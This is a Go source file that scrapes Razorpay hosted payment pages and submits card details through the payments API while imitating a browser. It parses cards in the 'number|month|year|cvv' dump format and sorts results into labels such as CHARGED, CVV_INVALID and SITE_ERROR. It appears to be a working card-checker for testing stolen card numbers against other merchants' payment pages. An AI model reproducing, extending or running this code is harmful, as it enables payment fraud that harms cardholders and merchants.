package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io"
	"net/http"
	"net/url"
	"regexp"
	"strconv"
	"strings"
)

type PaymentResult struct {
	Status   string `json:"status"`
	Response string `json:"response"`
	Message  string `json:"message"`
}

// ScrapePage fetches the hosted page and extracts checkout configuration.
func (s *RazorpaySession) ScrapePage() error {
	req, err := http.NewRequest("GET", s.PageURL, nil)
	if err != nil {
		return err
	}
	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")

	resp, err := s.Client.Do(req)
	if err != nil {
		return fmt.Errorf("failed to fetch page: %w", err)
	}
	defer resp.Body.Close()

	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("failed to read body: %w", err)
	}
	html := string(bodyBytes)

	// Extract data JSON block
	re := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)
	match := re.FindStringSubmatch(html)
	if len(match) < 2 {
		return fmt.Errorf("could not find data block in page HTML")
	}

	var parsed map[string]any
	if err := json.Unmarshal([]byte(match[1]), &parsed); err != nil {
		return fmt.Errorf("failed to parse page JSON: %w", err)
	}

	keyID, _ := parsed["key_id"].(string)
	if keyID == "" {
		return fmt.Errorf("key_id not found in page data")
	}
	s.KeyID = keyID

	// Extract keyless_header from html page
	keylessRe := regexp.MustCompile(`(?i)keyless_header\s*:\s*"([^"]+)"`)
	if keylessMatch := keylessRe.FindStringSubmatch(html); len(keylessMatch) > 1 {
		s.KeylessHeader = keylessMatch[1]
	} else if keylessVal, ok := parsed["keyless_header"].(string); ok {
		s.KeylessHeader = keylessVal
	}

	paymentLink, _ := parsed["payment_link"].(map[string]any)
	if paymentLink == nil {
		return fmt.Errorf("payment_link metadata not found")
	}

	pageID, _ := paymentLink["id"].(string)
	if pageID == "" {
		return fmt.Errorf("payment page ID not found")
	}
	s.PageID = pageID

	currency, _ := paymentLink["currency"].(string)
	if currency == "" {
		currency = "INR"
	}
	s.Currency = currency

	// Extract minimum amount limit if defined on payment link (already in Paise)
	var globalMin int
	if val, ok := paymentLink["min_amount_value"].(float64); ok && val > 0 {
		globalMin = int(val)
	} else if val, ok := parsed["min_amount_value"].(float64); ok && val > 0 {
		globalMin = int(val)
	}

	// Parse items to find all mandatory item IDs and their amounts
	items, _ := paymentLink["payment_page_items"].([]any)
	for _, it := range items {
		itemMap, ok := it.(map[string]any)
		if !ok {
			continue
		}
		id, _ := itemMap["id"].(string)
		
		// Handle both bool and string versions of "mandatory"
		var mandatory bool
		if mandVal, ok := itemMap["mandatory"].(bool); ok {
			mandatory = mandVal
		} else if mandValStr, ok := itemMap["mandatory"].(string); ok {
			mandatory = strings.EqualFold(mandValStr, "true") || mandValStr == "1"
		}
		
		itemDetail, _ := itemMap["item"].(map[string]any)
		var unitAmt float64
		if itemDetail != nil {
			if val, ok := itemDetail["amount"].(float64); ok && val > 0 {
				unitAmt = val
			} else if val, ok := itemDetail["unit_amount"].(float64); ok && val > 0 {
				unitAmt = val
			} else if valStr, ok := itemDetail["amount"].(string); ok {
				unitAmt, _ = strconv.ParseFloat(valStr, 64)
			} else if valStr, ok := itemDetail["unit_amount"].(string); ok {
				unitAmt, _ = strconv.ParseFloat(valStr, 64)
			}
		}

		// If unitAmt is still 0, check item min_amount (already in Paise)
		if unitAmt == 0 {
			if val, ok := itemDetail["min_amount"].(float64); ok && val > 0 {
				unitAmt = val
			} else if val, ok := itemMap["min_amount"].(float64); ok && val > 0 {
				unitAmt = val
			}
		}

		itemAmountInt := int(unitAmt)
		if itemAmountInt < globalMin {
			itemAmountInt = globalMin
		}

		// A mandatory page item OR the first item if no item selected yet
		if mandatory || s.ItemID == "" {
			if s.ItemID == "" {
				s.ItemID = id
				s.ItemAmount = itemAmountInt
			}
			if mandatory {
				s.MandatoryItems = append(s.MandatoryItems, map[string]any{
					"payment_page_item_id": id,
					"amount":               itemAmountInt,
				})
			}
		}
	}

	// Fallback to custom input amount if total amount is zero/empty
	if s.ItemAmount == 0 && len(s.MandatoryItems) == 0 {
		if s.CustomAmount <= 0 {
			s.CustomAmount = 100 // default 100 INR for open donation/custom amount pages
		}
		s.ItemAmount = s.CustomAmount * 100
		if s.ItemAmount < globalMin {
			s.ItemAmount = globalMin
		}
		s.MandatoryItems = append(s.MandatoryItems, map[string]any{
			"payment_page_item_id": s.ItemID,
			"amount":               s.ItemAmount,
		})
	} else if len(s.MandatoryItems) > 0 {
		// Sum up total amount of all mandatory items
		total := 0
		for _, item := range s.MandatoryItems {
			if amt, ok := item["amount"].(int); ok {
				total += amt
			}
		}
		s.ItemAmount = total
	}

	return nil
}

type RazorpaySession struct {
	Client         *http.Client
	ProxyURL       string
	PageURL        string
	KeyID          string
	PageID         string
	Currency       string
	ItemID         string
	ItemAmount     int // amount in paise
	CustomAmount   int // amount in INR
	MandatoryItems []map[string]any
	KeylessHeader  string
}

// CreateOrder sends the order initialization payload to Razorpay and returns the order_id.
func (s *RazorpaySession) CreateOrder(name, email, phone string) (string, error) {
	url := fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", s.PageID)

	lineItems := s.MandatoryItems
	if len(lineItems) == 0 {
		lineItems = []map[string]any{
			{
				"payment_page_item_id": s.ItemID,
				"amount":               s.ItemAmount,
			},
		}
	}

	payload := map[string]any{
		"line_items": lineItems,
		"notes": map[string]string{
			"name":  name,
			"email": email,
			"phone": phone,
		},
	}

	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return "", err
	}

	req, err := http.NewRequest("POST", url, bytes.NewReader(bodyBytes))
	if err != nil {
		return "", err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://pages.razorpay.com")
	req.Header.Set("Referer", s.PageURL)
	if s.KeylessHeader != "" {
		req.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
	}

	resp, err := s.Client.Do(req)
	if err != nil {
		return "", fmt.Errorf("order initialization failed: %w", err)
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}

	if resp.StatusCode != http.StatusOK && resp.StatusCode != http.StatusCreated {
		return "", fmt.Errorf("order creation HTTP %d: %s", resp.StatusCode, string(respBytes))
	}

	var parsed map[string]any
	if err := json.Unmarshal(respBytes, &parsed); err != nil {
		return "", err
	}

	orderData, _ := parsed["order"].(map[string]any)
	if orderData == nil {
		return "", fmt.Errorf("order object missing in response: %s", string(respBytes))
	}

	orderID, _ := orderData["id"].(string)
	if orderID == "" {
		return "", fmt.Errorf("order_id missing in response")
	}

	return orderID, nil
}

// SubmitPayment authorizes the card using Razorpay payments API.
func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, email, phone, orderID string) (*PaymentResult, error) {
	targetURL := "https://api.razorpay.com/v1/payments"

	payload := map[string]any{
		"key_id":   s.KeyID,
		"order_id": orderID,
		"amount":   s.ItemAmount,
		"currency": s.Currency,
		"email":    email,
		"contact":  phone,
		"method":   "card",
		"card": map[string]string{
			"number":       cardNo,
			"cvv":          cvv,
			"expiry_month": expMonth,
			"expiry_year":  expYear,
			"name":         name,
		},
		"_": map[string]string{
			"integration":      "payment_pages",
			"integration_type": "rzp_app",
			"version":          "1.24.0",
		},
	}

	bodyBytes, err := json.Marshal(payload)
	if err != nil {
		return nil, err
	}

	req, err := http.NewRequest("POST", targetURL, bytes.NewReader(bodyBytes))
	if err != nil {
		return nil, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
	req.Header.Set("Content-Type", "application/json")
	req.Header.Set("Origin", "https://pages.razorpay.com")
	req.Header.Set("Referer", s.PageURL)
	if s.KeylessHeader != "" {
		req.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
	}

	resp, err := s.Client.Do(req)
	if err != nil {
		return nil, fmt.Errorf("payment submission failed: %w", err)
	}
	defer resp.Body.Close()

	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return nil, err
	}

	respStr := string(respBytes)
	reData := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)

	// Check if response is an intermediate fee breakup HTML form
	if strings.Contains(respStr, "payments/create/checkout") {
		formActionRe := regexp.MustCompile(`(?i)<form[^>]+action=['"]([^'"]+)['"]`)
		actionMatch := formActionRe.FindStringSubmatch(respStr)
		if len(actionMatch) > 1 {
			actionURL := actionMatch[1]

			// Extract all hidden form fields
			inputRe := regexp.MustCompile(`(?i)<input[^>]+type=['"]hidden['"][^>]+name=['"]([^'"]+)['"][^>]+value=['"]([^'"]*)['"]`)
			inputMatches := inputRe.FindAllStringSubmatch(respStr, -1)

			formData := url.Values{}
			for _, m := range inputMatches {
				if len(m) > 2 {
					formData.Set(m[1], m[2])
				}
			}

			// Send 2nd POST request to checkout action URL
			req2, err := http.NewRequest("POST", actionURL, strings.NewReader(formData.Encode()))
			if err == nil {
				req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
				req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req2.Header.Set("Origin", "https://pages.razorpay.com")
				req2.Header.Set("Referer", s.PageURL)
				if s.KeylessHeader != "" {
					req2.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
				}

				resp2, err2 := s.Client.Do(req2)
				if err2 == nil {
					defer resp2.Body.Close()
					resp2Bytes, _ := io.ReadAll(resp2.Body)
					respBytes = resp2Bytes
					respStr = string(resp2Bytes)
				}
			}
		}
	}

	// Try parsing JSON (from raw body or var data wrapper)
	var parsed map[string]any
	if match := reData.FindStringSubmatch(respStr); len(match) > 1 {
		_ = json.Unmarshal([]byte(match[1]), &parsed)
	} else {
		_ = json.Unmarshal(respBytes, &parsed)
	}

	if parsed != nil {
		// 1. Check for error payload regardless of HTTP status code
		if errData, ok := parsed["error"].(map[string]any); ok {
			reason, _ := errData["reason"].(string)
			desc, _ := errData["description"].(string)
			code, _ := errData["code"].(string)
			if desc == "" {
				desc = reason
			}
			if desc == "" {
				desc = code
			}
			if desc == "" {
				desc = "Declined by gateway"
			}

			responseCode := "CARD_DECLINED"
			statusText := "false"

			reasonUpper := strings.ToUpper(reason + " " + desc + " " + code)

			// Detect site / merchant account errors (e.g. temporary block placed on account)
			if strings.Contains(reasonUpper, "TEMPORARY BLOCK") ||
				strings.Contains(reasonUpper, "PUT ON HOLD") ||
				strings.Contains(reasonUpper, "DEACTIVATED") ||
				strings.Contains(reasonUpper, "ACCOUNT BLOCKED") ||
				strings.Contains(reasonUpper, "SITE ADMIN") ||
				strings.Contains(reasonUpper, "MANDATORY PAYMENT PAGE ITEM") ||
				strings.Contains(reasonUpper, "SHOULD BE ORDERED") {
				responseCode = "SITE_ERROR"
				statusText = "SiteError"
			} else if strings.Contains(reasonUpper, "INSUFFICIENT") {
				responseCode = "INSUFFICIENT_FUNDS"
			} else if strings.Contains(reasonUpper, "CVV") || strings.Contains(reasonUpper, "VERIFICATION") {
				responseCode = "CVV_INVALID"
			} else if strings.Contains(reasonUpper, "EXPIRED") {
				responseCode = "EXPIRED_CARD"
			}

			return &PaymentResult{
				Status:   statusText,
				Response: responseCode,
				Message:  desc,
			}, nil
		}

		// 2. Check for 3DS / Redirects / OTP in JSON
		if parsed["callback_url"] != nil || parsed["next"] != nil || parsed["action"] != nil {
			return &PaymentResult{
				Status:   "3ds",
				Response: "3DS_REQUIRED",
				Message:  "Card verification (OTP/3DS) is required by the bank",
			}, nil
		}

		// 3. Check for successful authorization/capture
		status, _ := parsed["status"].(string)
		if status == "captured" || status == "authorized" {
			return &PaymentResult{
				Status:   "success",
				Response: "CHARGED",
				Message:  "Payment Authorized Successfully (Charged)",
			}, nil
		}

		if status != "" {
			return &PaymentResult{
				Status:   "fail",
				Response: "CARD_DECLINED",
				Message:  fmt.Sprintf("Payment status: %s", status),
			}, nil
		}
	}

	// Check if HTML body contains 3DS / Bank OTP redirect form
	if strings.Contains(respStr, "3ds2Auth") ||
		strings.Contains(respStr, "pg_router") ||
		strings.Contains(respStr, "authenticate") ||
		strings.Contains(respStr, "3dsMethodPostingForm") ||
		strings.Contains(respStr, "Loading Bank page") ||
		strings.Contains(respStr, "RazorpayShield") {
		return &PaymentResult{
			Status:   "3ds",
			Response: "3DS_REQUIRED",
			Message:  "Card verification (OTP/3DS) is required by the bank",
		}, nil
	}

	return &PaymentResult{
		Status:   "fail",
		Response: "GATEWAY_ERROR",
		Message:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBytes)),
	}, nil
}

// Helper: Parse card line
func parseCC(ccLine string) (number, month, year, cvv string, ok bool) {
	ccLine = strings.TrimSpace(ccLine)
	parts := strings.Split(ccLine, "|")
	if len(parts) < 4 {
		return "", "", "", "", false
	}
	number = strings.ReplaceAll(parts[0], " ", "")
	month = parts[1]
	year = parts[2]
	cvv = parts[3]

	if len(month) == 1 {
		month = "0" + month
	}
	if len(year) == 2 {
		year = "20" + year
	}
	return number, month, year, cvv, true
}

func formatAmount(amtPaise int) string {
	return strconv.FormatFloat(float64(amtPaise)/100.0, 'f', 2, 64)
}
